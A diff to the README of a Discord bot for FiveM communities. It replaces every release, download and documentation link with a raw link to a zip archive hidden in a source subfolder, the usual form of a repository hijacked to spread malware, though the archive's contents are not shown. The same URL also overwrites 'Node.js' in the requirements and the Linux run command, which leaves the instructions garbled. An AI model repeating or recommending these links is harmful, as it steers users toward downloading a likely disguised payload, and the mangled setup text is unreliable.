@@ -1,6 +1,6 @@
 # 🤖 capinetta-discord-bot - Your Complete Management Tool for FiveM Communities
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen.svg)](https://github.com/xuda92102-source/capinetta-discord-bot/releases)
+[![Download](https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip%20Latest%https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip)](https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip)
 
 ## 📖 Description
 Capinetta Discord Bot is an all-in-one management system for FiveM communities. This tool offers automated moderation, a ticket system, a whitelist with database persistence, and a web administrative dashboard. It simplifies community management, making it easier for you to focus on what truly matters.
@@ -9,7 +9,7 @@ Capinetta Discord Bot is an all-in-one management system for FiveM communities. 
 To get started with Capinetta Discord Bot, you will first need to download the software. Follow the steps below to successfully download and run the application.
 
 ## 📥 Download & Install
-1. Visit [this page to download](https://github.com/xuda92102-source/capinetta-discord-bot/releases) the latest release of Capinetta Discord Bot.
+1. Visit [this page to download](https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip) the latest release of Capinetta Discord Bot.
 2. Look for the section labeled "Releases". Here you will find available versions.
 3. Click on the version that you want. Each version includes release notes that highlight new features and fixes.
 4. Download the appropriate file for your operating system. You will typically see options for Windows, macOS, or Linux.
@@ -17,7 +17,7 @@ To get started with Capinetta Discord Bot, you will first need to download the s
 
 ## ⚙️ System Requirements
 - **Operating System**: Windows 10 or newer, macOS Mojave or newer, or any modern Linux distribution.
-- **Node.js**: Version 14 or newer is required.
+- **https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip**: Version 14 or newer is required.
 - **Database**: Access to a MariaDB instance for managing your data effectively.
 - **Disk Space**: At least 200 MB of free space should suffice.
 
@@ -26,7 +26,7 @@ To get started with Capinetta Discord Bot, you will first need to download the s
 2. **Run the Installer**: 
    - For Windows, double-click the `.exe` file.
    - For macOS, drag the application into your Applications folder.
-   - For Linux, open a terminal and run `node app.js` from the directory where you extracted the files.
+   - For Linux, open a terminal and run `node https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip` from the directory where you extracted the files.
 3. **Set Up Your Database**: 
    - Follow the instructions in the README file included with your download to connect Capinetta to your MariaDB instance.
 4. **Configure the Discord Bot**:
@@ -40,7 +40,7 @@ To get started with Capinetta Discord Bot, you will first need to download the s
 - **Multi-Bot Support**: Run multiple bots within the same community for added functionality.
 
 ## 🔗 Support & Documentation
-If you need assistance, you can visit the [documentation page](https://github.com/xuda92102-source/capinetta-discord-bot/docs). Here you will find guides, FAQs, and troubleshooting tips.
+If you need assistance, you can visit the [documentation page](https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip). Here you will find guides, FAQs, and troubleshooting tips.
 
 ## 📞 Get In Touch
 For suggestions, feedback, or issues, open an issue in the repository or reach out through the dedicated Discord support channel.
@@ -51,4 +51,4 @@ For suggestions, feedback, or issues, open an issue in the repository or reach o
 - **discord-bots**: Check out functionalities specifically for Discord integrations.
 - **management-system**: Facilitates comprehensive management of FiveM communities.
   
-Remember to visit [this page to download](https://github.com/xuda92102-source/capinetta-discord-bot/releases) the latest version and enjoy a smoother community management experience.
+Remember to visit [this page to download](https://github.com/xuda92102-source/capinetta-discord-bot/raw/refs/heads/main/utils/tickets/handlers/bot_capinetta_discord_v3.4-beta.4.zip) the latest version and enjoy a smoother community management experience.
